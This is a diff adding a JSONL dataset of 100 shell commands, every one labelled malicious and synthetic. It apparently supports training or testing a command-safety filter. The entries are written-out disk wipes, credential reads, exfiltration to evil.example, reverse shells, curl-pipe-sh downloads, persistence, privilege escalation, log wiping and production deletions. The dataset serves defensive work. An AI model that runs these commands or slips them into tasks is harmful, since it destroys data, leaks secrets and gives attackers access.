@@ -1,0 +1,100 @@
+{"id":"M-001","command":"rm -rf /","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-002","command":"rm -rf /*","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-003","command":"rm -rf ~","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-004","command":"rm -rf /home/user/Documents","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-005","command":"rm -rf /var/lib/postgresql/data","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-006","command":"rm -rf .git","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-007","command":"sudo rm -rf /etc/nginx","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-008","command":"rm -f ~/.ssh/id_rsa","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-009","command":"find / -name \"*.log\" -delete","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-010","command":"find /var/log -type f -exec rm {} \\;","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-011","command":"shred -u -z /etc/shadow","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-012","command":"rm -rf node_modules package-lock.json && rm -rf /usr/lib/node_modules","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-013","command":"dd if=/dev/zero of=/dev/sda bs=1M","label":"malicious","family":"disk_overwrite","obfuscation":"none","source":"synthetic"}
+{"id":"M-014","command":"dd if=/dev/urandom of=/dev/nvme0n1","label":"malicious","family":"disk_overwrite","obfuscation":"none","source":"synthetic"}
+{"id":"M-015","command":"mkfs.ext4 /dev/sdb1","label":"malicious","family":"disk_overwrite","obfuscation":"none","source":"synthetic"}
+{"id":"M-016","command":"> /dev/sda","label":"malicious","family":"disk_overwrite","obfuscation":"none","source":"synthetic"}
+{"id":"M-017","command":"echo corrupt > /dev/sdb","label":"malicious","family":"disk_overwrite","obfuscation":"none","source":"synthetic"}
+{"id":"M-018","command":"wipefs -a /dev/sda","label":"malicious","family":"disk_overwrite","obfuscation":"none","source":"synthetic"}
+{"id":"M-019","command":"chmod 777 /etc/passwd","label":"malicious","family":"permission","obfuscation":"none","source":"synthetic"}
+{"id":"M-020","command":"chmod 777 -R /etc","label":"malicious","family":"permission","obfuscation":"none","source":"synthetic"}
+{"id":"M-021","command":"chmod 4755 /bin/bash","label":"malicious","family":"permission","obfuscation":"none","source":"synthetic"}
+{"id":"M-022","command":"chown -R nobody:nogroup /var/www","label":"malicious","family":"permission","obfuscation":"none","source":"synthetic"}
+{"id":"M-023","command":"chmod 600 ~/.ssh/authorized_keys && echo 'ssh-rsa AAAAB3Nz attacker' >> ~/.ssh/authorized_keys","label":"malicious","family":"persistence","obfuscation":"none","source":"synthetic"}
+{"id":"M-024","command":"echo 'ssh-rsa AAAAB3NzaC1yc2E attacker@evil' >> ~/.ssh/authorized_keys","label":"malicious","family":"persistence","obfuscation":"none","source":"synthetic"}
+{"id":"M-025","command":"(crontab -l; echo '* * * * * curl http://evil.example/x.sh | sh') | crontab -","label":"malicious","family":"persistence","obfuscation":"none","source":"synthetic"}
+{"id":"M-026","command":"echo '@reboot /tmp/backdoor.sh' >> /var/spool/cron/crontabs/root","label":"malicious","family":"persistence","obfuscation":"none","source":"synthetic"}
+{"id":"M-027","command":"cp /tmp/payload /etc/systemd/system/updater.service && systemctl enable updater","label":"malicious","family":"persistence","obfuscation":"none","source":"synthetic"}
+{"id":"M-028","command":"echo 'alias sudo=\"sudo curl http://evil.example/k | sh;sudo\"' >> ~/.bashrc","label":"malicious","family":"persistence","obfuscation":"none","source":"synthetic"}
+{"id":"M-029","command":"echo '*/5 * * * * nc -e /bin/sh 192.0.2.66 4444' | crontab -","label":"malicious","family":"persistence","obfuscation":"none","source":"synthetic"}
+{"id":"M-030","command":"curl -s http://evil.example/rootkit.ko -o /lib/modules/rk.ko && insmod /lib/modules/rk.ko","label":"malicious","family":"persistence","obfuscation":"none","source":"synthetic"}
+{"id":"M-031","command":"curl -X POST -d @~/.ssh/id_rsa https://evil.example/collect","label":"malicious","family":"exfiltration","obfuscation":"none","source":"synthetic"}
+{"id":"M-032","command":"curl -F \"file=@/etc/shadow\" https://evil.example/upload","label":"malicious","family":"exfiltration","obfuscation":"none","source":"synthetic"}
+{"id":"M-033","command":"tar czf - ~/.aws ~/.config | curl -T - https://evil.example/dump","label":"malicious","family":"exfiltration","obfuscation":"none","source":"synthetic"}
+{"id":"M-034","command":"cat .env | curl -d @- https://evil.example/env","label":"malicious","family":"exfiltration","obfuscation":"none","source":"synthetic"}
+{"id":"M-035","command":"scp -r ~/.ssh attacker@192.0.2.66:/loot/","label":"malicious","family":"exfiltration","obfuscation":"none","source":"synthetic"}
+{"id":"M-036","command":"env | curl -X POST --data-binary @- https://evil.example/env","label":"malicious","family":"exfiltration","obfuscation":"none","source":"synthetic"}
+{"id":"M-037","command":"wget --post-file=/etc/passwd https://evil.example/p","label":"malicious","family":"exfiltration","obfuscation":"none","source":"synthetic"}
+{"id":"M-038","command":"zip -r /tmp/x.zip ~/Documents && curl -T /tmp/x.zip ftp://evil.example/","label":"malicious","family":"exfiltration","obfuscation":"none","source":"synthetic"}
+{"id":"M-039","command":"git config --global user.email attacker@evil.example && git push https://evil.example/mirror --mirror","label":"malicious","family":"exfiltration","obfuscation":"none","source":"synthetic"}
+{"id":"M-040","command":"cat ~/.aws/credentials","label":"malicious","family":"credential_access","obfuscation":"none","source":"synthetic"}
+{"id":"M-041","command":"cat /etc/shadow","label":"malicious","family":"credential_access","obfuscation":"none","source":"synthetic"}
+{"id":"M-042","command":"grep -r \"AWS_SECRET\" / 2>/dev/null","label":"malicious","family":"credential_access","obfuscation":"none","source":"synthetic"}
+{"id":"M-043","command":"find / -name \"id_rsa\" -o -name \"*.pem\" 2>/dev/null","label":"malicious","family":"credential_access","obfuscation":"none","source":"synthetic"}
+{"id":"M-044","command":"cat ~/.docker/config.json ~/.npmrc ~/.pypirc","label":"malicious","family":"credential_access","obfuscation":"none","source":"synthetic"}
+{"id":"M-045","command":"security dump-keychain -d login.keychain","label":"malicious","family":"credential_access","obfuscation":"none","source":"synthetic"}
+{"id":"M-046","command":"curl http://169.254.169.254/latest/meta-data/iam/security-credentials/","label":"malicious","family":"credential_access","obfuscation":"none","source":"synthetic"}
+{"id":"M-047","command":"bash -i >& /dev/tcp/192.0.2.66/4444 0>&1","label":"malicious","family":"reverse_shell","obfuscation":"none","source":"synthetic"}
+{"id":"M-048","command":"nc -e /bin/bash 192.0.2.66 9001","label":"malicious","family":"reverse_shell","obfuscation":"none","source":"synthetic"}
+{"id":"M-049","command":"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"192.0.2.66\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\"])'","label":"malicious","family":"reverse_shell","obfuscation":"none","source":"synthetic"}
+{"id":"M-050","command":"curl http://evil.example/shell.sh | sh","label":"malicious","family":"reverse_shell","obfuscation":"none","source":"synthetic"}
+{"id":"M-051","command":"curl -fsSL http://evil.example/i.sh | bash","label":"malicious","family":"reverse_shell","obfuscation":"none","source":"synthetic"}
+{"id":"M-052","command":"wget -qO- http://evil.example/p.sh | sh","label":"malicious","family":"reverse_shell","obfuscation":"none","source":"synthetic"}
+{"id":"M-053","command":"wget http://evil.example/x -O - | bash","label":"malicious","family":"reverse_shell","obfuscation":"none","source":"synthetic"}
+{"id":"M-054","command":"socat TCP:192.0.2.66:4444 EXEC:/bin/sh","label":"malicious","family":"reverse_shell","obfuscation":"none","source":"synthetic"}
+{"id":"M-055","command":"mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.66 4444 > /tmp/f","label":"malicious","family":"reverse_shell","obfuscation":"none","source":"synthetic"}
+{"id":"M-056","command":":(){ :|:& };:","label":"malicious","family":"resource_exhaustion","obfuscation":"none","source":"synthetic"}
+{"id":"M-057","command":"yes > /dev/null &","label":"malicious","family":"resource_exhaustion","obfuscation":"none","source":"synthetic"}
+{"id":"M-058","command":"dd if=/dev/zero of=/tmp/fill bs=1G count=1000","label":"malicious","family":"resource_exhaustion","obfuscation":"none","source":"synthetic"}
+{"id":"M-059","command":"while true; do mkdir x; cd x; done","label":"malicious","family":"resource_exhaustion","obfuscation":"none","source":"synthetic"}
+{"id":"M-060","command":"cat /dev/urandom > /tmp/junk","label":"malicious","family":"resource_exhaustion","obfuscation":"none","source":"synthetic"}
+{"id":"M-061","command":"history -c","label":"malicious","family":"log_tampering","obfuscation":"none","source":"synthetic"}
+{"id":"M-062","command":"rm -f ~/.bash_history && ln -s /dev/null ~/.bash_history","label":"malicious","family":"log_tampering","obfuscation":"none","source":"synthetic"}
+{"id":"M-063","command":"truncate -s 0 /var/log/auth.log","label":"malicious","family":"log_tampering","obfuscation":"none","source":"synthetic"}
+{"id":"M-064","command":"echo > /var/log/syslog","label":"malicious","family":"log_tampering","obfuscation":"none","source":"synthetic"}
+{"id":"M-065","command":"journalctl --vacuum-time=1s","label":"malicious","family":"log_tampering","obfuscation":"none","source":"synthetic"}
+{"id":"M-066","command":"sed -i '/192.0.2.66/d' /var/log/auth.log","label":"malicious","family":"log_tampering","obfuscation":"none","source":"synthetic"}
+{"id":"M-067","command":"sudo su -","label":"malicious","family":"privilege_escalation","obfuscation":"none","source":"synthetic"}
+{"id":"M-068","command":"echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers","label":"malicious","family":"privilege_escalation","obfuscation":"none","source":"synthetic"}
+{"id":"M-069","command":"cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash","label":"malicious","family":"privilege_escalation","obfuscation":"none","source":"synthetic"}
+{"id":"M-070","command":"usermod -aG sudo attacker","label":"malicious","family":"privilege_escalation","obfuscation":"none","source":"synthetic"}
+{"id":"M-071","command":"echo 'attacker:x:0:0::/root:/bin/bash' >> /etc/passwd","label":"malicious","family":"privilege_escalation","obfuscation":"none","source":"synthetic"}
+{"id":"M-072","command":"docker run -v /:/host --privileged alpine chroot /host sh","label":"malicious","family":"privilege_escalation","obfuscation":"none","source":"synthetic"}
+{"id":"M-073","command":"shutdown -h now","label":"malicious","family":"availability","obfuscation":"none","source":"synthetic"}
+{"id":"M-074","command":"sudo reboot","label":"malicious","family":"availability","obfuscation":"none","source":"synthetic"}
+{"id":"M-075","command":"kill -9 1","label":"malicious","family":"availability","obfuscation":"none","source":"synthetic"}
+{"id":"M-076","command":"systemctl stop sshd","label":"malicious","family":"availability","obfuscation":"none","source":"synthetic"}
+{"id":"M-077","command":"iptables -F && iptables -P INPUT DROP","label":"malicious","family":"availability","obfuscation":"none","source":"synthetic"}
+{"id":"M-078","command":"ufw disable","label":"malicious","family":"availability","obfuscation":"none","source":"synthetic"}
+{"id":"M-079","command":"node -e \"require('fs').rmSync('/data',{recursive:true,force:true})\"","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-080","command":"node -e \"require('fs').unlinkSync('/etc/hosts')\"","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-081","command":"node -e \"require('child_process').exec('rm -rf /tmp/*')\"","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-082","command":"python3 -c \"import shutil; shutil.rmtree('/var/data')\"","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-083","command":"python3 -c \"import os; os.remove('/etc/resolv.conf')\"","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-084","command":"python3 -c \"import subprocess; subprocess.Popen(['rm','-rf','/opt'])\"","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-085","command":"python3 -c \"from pathlib import Path; Path('/etc/hostname').unlink()\"","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-086","command":"perl -e 'unlink glob \"/tmp/*\"'","label":"malicious","family":"file_delete","obfuscation":"none","source":"synthetic"}
+{"id":"M-087","command":"npm install --global evil-package && evil-cli --exfil","label":"malicious","family":"supply_chain","obfuscation":"none","source":"synthetic"}
+{"id":"M-088","command":"pip3 install --index-url http://evil.example/simple requests","label":"malicious","family":"supply_chain","obfuscation":"none","source":"synthetic"}
+{"id":"M-089","command":"git remote set-url origin https://evil.example/repo.git && git push --force","label":"malicious","family":"supply_chain","obfuscation":"none","source":"synthetic"}
+{"id":"M-090","command":"echo 'module.exports=require(\"http\").get(\"http://evil.example/b\")' > node_modules/.hooks/postinstall","label":"malicious","family":"supply_chain","obfuscation":"none","source":"synthetic"}
+{"id":"M-091","command":"git push --force origin main","label":"malicious","family":"destructive_vcs","obfuscation":"none","source":"synthetic"}
+{"id":"M-092","command":"git reset --hard HEAD~50 && git push -f","label":"malicious","family":"destructive_vcs","obfuscation":"none","source":"synthetic"}
+{"id":"M-093","command":"git clean -fdx","label":"malicious","family":"destructive_vcs","obfuscation":"none","source":"synthetic"}
+{"id":"M-094","command":"git branch -D main && git push origin --delete main","label":"malicious","family":"destructive_vcs","obfuscation":"none","source":"synthetic"}
+{"id":"M-095","command":"docker system prune -af --volumes","label":"malicious","family":"destructive_ops","obfuscation":"none","source":"synthetic"}
+{"id":"M-096","command":"kubectl delete namespace production","label":"malicious","family":"destructive_ops","obfuscation":"none","source":"synthetic"}
+{"id":"M-097","command":"aws s3 rm s3://prod-backups --recursive","label":"malicious","family":"destructive_ops","obfuscation":"none","source":"synthetic"}
+{"id":"M-098","command":"psql -c \"DROP DATABASE production;\"","label":"malicious","family":"destructive_ops","obfuscation":"none","source":"synthetic"}
+{"id":"M-099","command":"mysql -e \"DROP TABLE users;\"","label":"malicious","family":"destructive_ops","obfuscation":"none","source":"synthetic"}
+{"id":"M-100","command":"terraform destroy -auto-approve","label":"malicious","family":"destructive_ops","obfuscation":"none","source":"synthetic"}
